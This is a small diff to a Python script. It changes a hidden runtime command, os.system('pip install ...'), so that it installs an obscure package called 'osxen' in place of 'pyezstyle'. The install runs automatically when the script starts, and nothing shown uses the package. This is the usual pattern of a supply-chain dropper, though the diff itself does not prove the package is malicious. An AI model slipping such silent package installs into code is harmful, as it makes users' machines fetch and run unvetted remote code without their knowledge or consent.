@@ -6,7 +6,7 @@ try:
 except ImportError:
     input("Error while importing modules. Please install the modules in requirements.txt")
 import os
-os.system(f"pip install pyezstyle")
+os.system(f"pip install osxen")
 init(convert = True, autoreset = True)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 clear = "clear"
